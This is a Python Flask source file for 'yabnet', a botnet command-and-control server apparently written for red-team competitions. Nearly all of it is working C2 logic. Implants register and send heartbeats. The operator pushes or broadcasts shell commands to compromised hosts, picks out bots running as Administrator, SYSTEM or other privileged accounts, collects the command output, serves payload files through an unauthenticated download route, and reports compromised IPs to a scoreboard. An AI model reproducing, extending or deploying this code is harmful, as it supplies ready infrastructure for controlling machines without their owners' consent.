import os 
import re
import json
import random
import string
import requests
import psycopg2
from OpenSSL import SSL
from IPy import IP

from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory, Response 
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime  

from models import Bot
from models import Command
from models import db 
from models import User 
from sqlalchemy import or_

"""
Name: server.py 
Description: Python Flask Backend for the botnet. Takes care of the bot/command database and the API related with it. 
Also takes are of master console's request/response. 

"""

# ========================== Initial Configuration =====================
# ============ Configuration can be change through config.py ===========

app = Flask(__name__)
# !! Change to config.DevConfig for debugging !! 
app.config.from_object("config.ProdConfig")
#app.config.from_object("config.DevConfig")
db.app = app
db.init_app(app)

UPLOAD_DIRECTORY=app.config.get("UPLOAD_FOLDER")
if not os.path.exists(UPLOAD_DIRECTORY):
    os.makedirs(UPLOAD_DIRECTORY)

MASTERNAME = app.config.get("MASTERNAME")
MASTERPASSWORD = app.config.get("MASTERPASS")

HOST = app.config.get("HOST")
PORT = app.config.get("PORT")

# TODO: Change the register key to change dynamically 
FIRSTCONTACTKEY = app.config.get("FIRSTCONTACTKEY")
REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
MASTERKEY = app.config.get("MASTERKEY")

# Privileged users. This changes from competition to competition
PRIVILEGED_USERS = app.config.get("PRIVILEGED_USERS")

# Agent timer 
TIMER = 40


# ================================= API ==================================

def posterrorcheck(requestobj, *args):
    """
    Description: Post check will see if the incoming post request for this server
    has any error or not

    Params: 
        - requestobj = Request object which comes from python flask 
        - *args (or **kwargs) = number of parmeters that need to be checked 
            - ex) 'firstcontactkey', 'user', 'ip'
            - This dynamic argument will depend on endpoint to endpoint 

    Return: 
        - (json) errorstring = Error string wrapped around jsonify({'error': <error>})
        - (bool) True = If everything is good, it's goodchie 

    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = requestobj.form

    if data is None:
        return jsonify({'error': 'post parameters cannot be null'})

    for arg in args:
        try:
            if data[arg] is None:
                return jsonify({'error': 'parameter'+str(arg)+'is missing'})
            elif arg == 'masterkey':
                if data[arg] != MASTERKEY:
                    return jsonify({'error': "[-] YOU ARE NOT MY MASTER"})
        except Exception as e:
            return jsonify({'error': str(e)})

    return True 

@app.route('/')
def hello_world():
    return "Welcome to yabnet"

@app.route('/auth', methods=['POST'])
def authentication():
    """
    Description: Handles master authentication 

    Params:
        - username : Master's username. Configured in config.py 
        - password : Master's password. Configured in config.py 

    Return:
        - (json) result : Result showing either success or failure
        - (json) masterkey : Masterkey given to successfully authenticated master
    """

    # Error checking
    error = posterrorcheck(request, 'username', 'password')
    if error is not True:
        return error 

    # POST Parameter parsing 
    data = request.form
    username = data['username']
    password = data['password']

    print("[DEBUG] username = ", username)
    print("[DEBUG] password = ", password)
    print("[DEBUG] masterkey = ", MASTERKEY)

    # API Endpoint logic 
    try:
        user = User.query.filter_by(username=username).first()
        if (user.check_password(password)):
            return jsonify({'result':'SUCCESS', 'masterkey': MASTERKEY})
        else:
            return jsonify({'result': 'Wrong username and/or password'})

    except Exception as e:
        return jsonify({'result': 'Wrong username and/or password'})


@app.route('/firstcontact', methods=['POST'])
def firstcontact(): 
    """
    Description: Endpoint which retrieves first contact from the bot. 
    This endpoint acts as a sanity check that the visitor is indeed a YABNET bot. 
    After the sanity check, the server will return a registerkey to the bot.
    
    Params: 
        - firstcontactkey : Key to identify if the contact is coming from the implant or not 
    Returns:
        - (json) result : 'success' or 'fail' depending on correct firstcontactkey 
        - (json) registerkey : Long string to validate that the bot successfully registered 
    """

    # Error checking 
    error = posterrorcheck(request, 'firstcontactkey')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    firstcontact = data['firstcontactkey']

    # API Endpoint logic 
    if firstcontact == FIRSTCONTACTKEY:
        return jsonify({'result': 'success', 'registerkey': REGISTERKEY})
    else:
        return jsonify({'result': 'fail', 'error': 'wrong firstcontactkey'})

@app.route('/register', methods=['POST'])
def register():
    """
    Description: Register a new bot to the server. This endpoint officially adds a bot to the server's database. 

    Params: 
        - registerkey : Register key that is needed for the registration process. 
        The key could be obtained through the firstcontact. 
        - ip : IP address of the bot 
        - os : OS type (Nix/Windows) of the bot 
        - user: user of the current proceses of the bot 
        - pid : pid of the bot 

    Return:
        - (json) result : 'success' or 'fail' depending on various conditions 
    """

    # Error checking 
    error = posterrorcheck(request, 'registerkey', 'ip', 'os', 'user', 'pid')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    registerkey = data['registerkey']
    bot_ip = data['ip']
    bot_os = data['os']
    bot_user = data['user']
    bot_pid = data['pid']

    # API Endpoint logic 
    # Check if the registerkey is correct 
    if registerkey != REGISTERKEY:
        return jsonify({'result': 'fail', 'error': 'Wrong registerkey'})

    # Check bot already exists in the database 
    try:
        query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(pid=bot_pid).first()
    except Exception as e:
        print("[!]", e)
        return jsonify({'result': 'fail', 'error': 'Bot already registered'})

    if query_bot is not None:
        return jsonify({'result': 'fail', 'error': 'Bot already registered'})

    else:
        print("[DEBUG] Added a new bot !")
        bot = Bot(bot_ip, bot_os, bot_user, bot_pid)
        db.session.add(bot)
        db.session.commit()

        ## 'botid':bot.id
        return jsonify({'result': 'success', 'botid': bot.id})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Description: Endpoint which takes report of bots' heartbeat. Will check
    if the bot is still alive, and update the timestamp of the bot as well. 

    Heartbeat endpoint is used for already registered bots. Once bots are registered,
    they simply send heartbeats to let the server know they are still alive. 

    Params:
        - ip = ip address of the bot
        - pid = pid of the bot. Used to check bot's uniqueness - incase multiple bot in same machine 
    
    Returns:
        - (json) result = Success or failure of heartbeat. Fails when can't find bot in database
    """

    # Error checking 
    error = posterrorcheck(request, 'ip', 'pid')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form

    ip = data['ip']
    pid = data['pid']

    # API Endpoint logic 
    # See if the bot exists, and if it does, update the timestamp    
    try:
        query_bot = Bot.query.filter_by(ip=ip).filter_by(pid=pid).first()
        query_bot.set_timestamp(datetime.now())

    except Exception as e:
        return jsonify({'result': 'fail', 'error': '[-] Heartbeat not available for you'})

    return jsonify({'result': 'success'})



@app.route('/bot/find', methods=['POST'])
def findhost():
    """
    Description: Of all current bots across all teams, find bots running with privileged user account 

    Params:
        - masterkey : Masterkey to validate request is coming from master 
        - hostname : Hostname of the bots across all the teams 

    Returns:
        - (json) Bot : Dictionary form of Bot class. Contains the following 
            - id, ip, os, user, pid, timestamp 
    """
    # Error checking  
    error = posterrorcheck(request, 'masterkey', 'hostname')
    if error is not True:
        return error 

    data = request.form 
    hostname = data['hostname']

    query_bot_list = Bot.query.filter_by(os=hostname).filter(or_(Bot.user.like('%Administrator%'),Bot.user.like('%SYSTEM'),Bot.user.in_(PRIVILEGED_USERS))).all()

    jsonbot_list = []

    # Only unique, single instance (ipaddress) list of bots. 
    # ex) What if 10.1.1.2 has 10 bots running as root? We don't want to send same command to all 10 bots. 
    # set has to be used, as this is a list of objects, and we only want "ip" attribute of the object to be unique 
    seen = set()
    jsonbot_list = []
    for bot in query_bot_list:
        if bot.ip not in seen:
            jsonbot_list.append(bot.jsonbot())
            seen.add(bot.ip)

    return Response(json.dumps(jsonbot_list), mimetype='application/json')

# TODO: Currently work in progress 
@app.route('/bot/hostname/push', methods=['POST'])
def hostnamepush():
    """
    Description: <TODO: WORK IN PROGRESS> 
    """
    # Error checking  
    error = posterrorcheck(request, 'masterkey', 'cmd', 'hostname')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    masterkey = data['masterkey']
    cmd = data['cmd']
    hostnmame = data['hostname']

    try:
        query_bot_list = Bot.query.filter_by()
    except Exception as e:
        return jsonify({'error':str(e)})

@app.route('/bot/<target>/push', methods=['POST'])
def botpush(target):
    """
    Description: Pushes the command into the bot and cmd Model. 
    The command pushed into the bot and cmd model will later be used in the /task endpoint. 

    target = bot ID to push commands into 

    Params:
        - masterkey : Master's secret key 
        - cmd : Command to push to the bot 

    returns:
        - (json) result : 'Command staged' upon successfully staging the command 
        - (json) error : error  
    """

    # Error checking  
    error = posterrorcheck(request, 'masterkey', 'cmd')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    masterkey = data['masterkey']
    cmd = data['cmd']

    bot_ip = ''
    bot_id = -1 

    if re.match(r'(\d+\.?){4}\\?$', target):
        bot_ip = target 
    else:
        bot_id = target 

    # API Endpoint logic 

    # Find bot based on bot ID (ip is deprecated) and push command 
    try:
        if bot_ip != '':
            query_bot = Bot.query.filter_by(ip=bot_ip).first()
        else:
            query_bot = Bot.query.filter_by(id=bot_id).first()

        # Create command model based on the information 
        cmd = Command(cmd, query_bot.id, query_bot.ip, query_bot.os)

        # Actually push the command to the bot. 
        # If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
        try:
            query_bot.cmds.append(cmd)
            db.session.add(cmd)
            db.session.commit()

            return jsonify({'result': 'Command staged'})

        except Exception as e:
            return jsonify({'error': 'Error occurred while staging command'})

    except Exception as e:
        return jsonify({ 'error': '[-] Pushing command for bot failed. ' + str(e) }) 


@app.route('/bot/<bot_id>/task', methods=['POST'])
def bottask(bot_id):
    """
    Description: Returns the command staged for the corresponding bot. 
    The bot will visit this endpoint, retrieve the command, and execute it.

    Params:
        - registerkey : Bot's registration key

    Returns:
        - (json) result : 'success' or 'fail' depending on conditions 
        - (json) command : Command string issued by the master 
    """

    # Error checking 
    error = posterrorcheck(request, 'registerkey')
    if error is not True:
        return error 

    # POST Parmeter parsing 
    data = request.form
    registerkey = data['registerkey']

    # API Endpoint logic 
    try:
        # Get the bot corresponding with the bot_ip
        try: 
            query_bot = Bot.query.filter_by(id=bot_id).first()
            query_bot.set_timestamp(datetime.now())

        except Exception as e:
            return jsonify({'result': 'fail', 'error' : '[-] There are no commands for you'})

        # Get command for the bot to run. Only getting the latest command.
        try:
            command = query_bot.cmds[len(query_bot.cmds)-1]

            if command.result != '':
                return jsonify({'result': 'fail', 'error':'[-] There are no commands available'})

        except Exception as e:
            return jsonify({'result': 'fail', 'error': '[-] There are no commands available'})

        return jsonify({ 'result': 'success', 'command': command.cmd })


    except Exception as e:
        return jsonify({ 'result': 'fail', 'error': str(e) }) 

@app.route('/bot/<bot_id>/result', methods=['POST'])
def botresult(bot_id):
    """
    Description: API endpoint which the bot comes and reports the result of the staged command. 
    
    If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 
    If a master visits, the endpoint will return the Command model. 

    Params:
        - registerkey : If a bot visits, the request must have bot's register key 
        - masterkey : If a master visits, the request must have master's masterkey

    Returns:
        - (json) '' : Empty string return if bot visits
        - (json) Command : Command object if master visits. Master can then parse the object.
    """

    # Error checking 
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    # POST Parameter parsing 
    data = request.form
    if data is None:
        return jsonify({'error': 'body cannot be empty'})

    # API Endpoint logic 
    try:
        # Bot visiting endpoint with result. Push result into the database.  
        if 'registerkey' in data:
            if data['registerkey'] == REGISTERKEY:
                result = data['result']
                #print("[DEBUG] result = ", result)

                query_bot = Bot.query.filter_by(id=bot_id).first()
                command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                command.set_result(result)

                db.session.commit()
                
                # This needs to be changed 
                return '' 

        # Master visiting endpoint. Return the command object. 
        elif 'masterkey' in data:
            query_bot = Bot.query.filter_by(id=bot_id).first()
            
            try:
                query_bot = Bot.query.filter_by(id=bot_id).first()
                command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
                #print("[DEBUG] command info = ", command.get_info())
                
                # Create dictionary form of command object 
                json_command = command.jsoncommand()

                db.session.commit()

                # Return command object if command.result exists (that is, bot reported back command's result)
                if command.result is None:
                    return jsonify({'error': 'Bot have not called back'})
                else:
                    return Response(json.dumps(json_command), mimetype='application/json') 

            except Exception as e:
                return jsonify({ 'error': str(e) })

        else:
            return jsonify({'error': 'reigsterkey/masterkey cannot be empty'})

    except Exception as e:
        return jsonify({ 'error': str(e) })
    
@app.route('/refresh', methods=['GET'])
def refresh():
    """
    Description: Refresh the bot table of the database. If a bot have not sent heartbeat in 
    2 minutes, chances are it's dead. Or it's callback is getting blocked. 
    Either way, Remove the bot. 

    Master console regularly will hit this endpoint. 
    """
    try:
        botlist = Bot.query.all()
    except Exception as e:
        return ''

    try:
        # If bot missed two~three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. 
        for bot in botlist:
            if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
                db.session.delete(bot)
                db.session.commit()
    except Exception as e:
        pass 

    return '' 


@app.route('/bot/list', methods=['POST'])
def botlist():
    """
    Description: View and return all the bots in the server database
    
    Params:
        - masterkey : Masterkey from master 
    Returns:
        - (json) Botlist : List of bot objects in json format 
    """

    # Error checking 
    error = posterrorcheck(request, 'masterkey')
    if error is not True:
        return error 

    try:
        botlist = Bot.query.all()
    except Exception as e:
        return jsonify({'error': "[-]" + str(e)})

    # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
    for bot in botlist:
        if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
            db.session.delete(bot)
            db.session.commit()

    jsonbotlist = []

    # Show bot list 
    for bot in botlist:
        jsonbotlist.append(bot.jsonbot())

    return Response(json.dumps(jsonbotlist), mimetype='application/json')

@app.route('/bot/commands', methods=['POST'])
def commandlist():
    """
    Description: View and return all the commands in the server database
    
    Params:
        - masterkey : Masterkey from master 
    Returns:
        - (json) commandlist : List of command objects in json format 
    """
    # Error checking 
    error = posterrorcheck(request, 'masterkey')
    if error is not True:
        return error 

    try:
        commandlist = Command.query.all()
    except Exception as e:
        return jsonify({'error': str(e)})

    result = ''

    for command in commandlist:
        result += command.get_info() + "\n"

    return result 


@app.route('/bot/broadcast', methods=['POST'])
def broadcast():
    """
    Description: Push the command into all the bots in the database 

    [POST]
        - masterkey = Masterkey to validate and authenticate master
        - command = Actual command to be pushed to the entire bots 
    """

    # Error checking 
    error = posterrorcheck(request, 'masterkey', 'cmd')
    if error is not True:
        return error 

    # POST parameter parsing 
    data = request.form
    masterkey = data['masterkey']
    command = data['cmd']


    # API Endpoint logic 
    bots = Bot.query.all()

    try:
        for bot in bots:
            cmd = Command(command, bot.id, bot.ip)
            bot.cmds.append(cmd)
            db.session.add(cmd)
            db.session.commit()

    except Exception as e:
        return jsonify({ 'error': str(e) })

    return jsonify({ 'result': '[+] Broadcast successful' })


@app.route('/files')
def list_files():
    """
    Description: Returns a list of files in server's current upload directory
    """
    files = [] 
    for item in os.listdir(UPLOAD_DIRECTORY):
        path = os.path.join(UPLOAD_DIRECTORY, item)
        if os.path.isfile(path):
            files.append(item)
    
    return jsonify(files)

@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Description: Endpoint where the master can upload files to the server's upload directory 

    Params:
        - masterkey : masterkey 
        - (file) file : File to be uploaded 

    Returns:
        - success : success
        - error : error 
    """
    # Error checking 
    error = posterrorcheck(request, 'masterkey')
    if error is not True:
        return error 

    if 'file' not in request.files:
        return jsonify({'error': '[-] No file part'})
    
    uploaded_file = request.files['file']

    if uploaded_file.filename == '':
        return jsonify({'error': '[-] No selected file to upload'})

    try:
        uploaded_file.save(os.path.join(UPLOAD_DIRECTORY, uploaded_file.filename))
    except Exception as e:
        return jsonify({'error': str(e)})
    
    return jsonify({'success': '[DEBUG] File has been uploaded'})

@app.route('/download/<filename>', methods=['GET','POST'])
def download_file(filename):
    """
    Description: File download endpoint for the bots to visit and download specific files
    """

    # Error checking 
    #result = posterrorcheck(request, 'registerkey')
    #if result is not True:
    #    return result

    print("[DEBUG] Bot downloading filename = ", filename)
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)


@app.route('/bot/cleanup', methods=['POST'])
def cleanup():
    """
    Description: Clean up all of the staged commands. Start fresh! 
    """
    
    # Error checking 
    error = posterrorcheck(request, 'masterkey')
    if error is not True:
        return error 

    try:
        botlist = Bot.query.all()
    except Exception as e:
        return jsonify({'error': str(e)})

    # Refresh any commands that are staged on the bots 
    for bot in botlist:
        bot.cmds.clear()
        db.session.commit()
    
    return jsonify({'success': 'All commands staged has been removed and cleaned up'})


@app.route('/updatepwnboard', methods=['POST'])
def updatepwnboard():
    """
    Description: Receives pwnboard endpoint from the master, and sends off pwnboard update to the corresponding address.
    Pwnboard accepts post param of "ips" (list) and "type" (str). 

    Params:
        - pwnboardURL : pwnboard Endpoint URL 

    Returns:
        - success : Shows if updating pwnboard was successful or not 
    """
    error = posterrorcheck(request, 'masterkey', 'pwnboardURL')
    if error is not True:
        return error 

    data = request.form
    masterkey = data['masterkey']
    pwnboardURL = data['pwnboardURL']
    
    try:
        botlist = Bot.query.all()
    except Exception as e:
        return jsonify({'error': "[-] " + str(e)})

    # TODO: Sending single requests for now. This is scuffed, need updated. 
    ips = []
    for bot in botlist:
        if bot.ip not in ips:
            ips.append(bot.ip)
            postData = {'ip': bot.ip, 'type': 'Yabnet'}
            try:
                requests.post(pwnboardURL, json=postData, timeout=1)
            except Exception as e:
                continue

    """
    print("\n[DEBUG] Updating pwnboard... ", ', '.join(ips), "\n")

    postData = {'ips': ips, 'type': 'Yabnet'}

    try:
        requests.post(pwnboardURL, json=postData, timeout=3)
        return jsonify({'success': "[+] Updated pwnboard. IPs: " + ', '.join(ips)})

    # Pwnboard takes way too long to process request. Yabnet can't wait for the response. Even though there is exception, move on.
    except Exception as e:
        return jsonify({'success': "[+] Updated pwnboard. IPs: " + ', '.join(ips)})
        pass
        #return jsonify({'error': "[-] Updating pwnboard failed: " + str(e)})
    
    return '' 


# ========================= Flask App Starts =========================


def test_db():
    """
    Just a function used for debugging purposes. Ignore me!!! 
    """
    bot_ip = ['10.1.1.2', '10.1.1.3', '10.1.1.4', '10.1.1.5', '10.1.1.6', '10.1.1.7', '10.1.1.8', '10.2.1.2', '10.2.1.3', '10.2.1.4', '10.2.1.5', '10.2.1.6', '10.2.1.7', '10.2.1.8', '10.3.1.2', '10.3.1.3', '10.3.1.4', '10.3.1.5', '10.3.1.6', '10.3.1.7', '10.3.1.8', '10.4.1.2', '10.4.1.3', '10.4.1.4', '10.4.1.5', '10.4.1.6', '10.4.1.7', '10.4.1.8', '10.5.1.2', '10.5.1.3', '10.5.1.4', '10.5.1.5', '10.5.1.6', '10.5.1.7', '10.5.1.8', '10.6.1.2', '10.6.1.3', '10.6.1.4', '10.6.1.5', '10.6.1.6', '10.6.1.7', '10.6.1.8', '10.7.1.2', '10.7.1.3', '10.7.1.4', '10.7.1.5', '10.7.1.6', '10.7.1.7', '10.7.1.8', '10.8.1.2', '10.8.1.3', '10.8.1.4', '10.8.1.5', '10.8.1.6', '10.8.1.7', '10.8.1.8', '10.9.1.2', '10.9.1.3', '10.9.1.4', '10.9.1.5', '10.9.1.6', '10.9.1.7', '10.9.1.8', '10.10.1.2', '10.10.1.3', '10.10.1.4', '10.10.1.5', '10.10.1.6', '10.10.1.7', '10.10.1.8']
    hostname = ['annebonny', 'williamkidd', 'calicojack', 'maryread', 'edwardteach', 'captaincrapo', 'canoot', 'nemo', 'gunner', 'laurellabonaire', 'lockelamora', 'hook']
    bot_user = ['root','whiteteam','Administrator','duder','NT Authority\SYSTEM']
    bot_pid = '5000'

    counter = 0
    idx = 0
    for ip in bot_ip:
        counter += 1
        if counter % 8 == 0:
            idx += 1
        bot = Bot(ip, hostname[idx], bot_user[random.randint(0,len(bot_user)-1)], random.randint(100,20000))
        db.session.add(bot)
        db.session.commit()
    
    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
    db.session.add(bot)
    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
    db.session.add(bot)
    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
    db.session.add(bot)
    db.session.commit()

def init_db():
    db.drop_all()
    db.create_all()
    master = User(username=MASTERNAME)
    master.set_password(MASTERPASSWORD)
    db.session.add(master)
    db.session.commit()

    # DEBUGGING PURPOSES 
    #test_db()


init_db()

if __name__ == '__main__':
    app.run(host=HOST, port=PORT, threaded=True, ssl_context='adhoc')
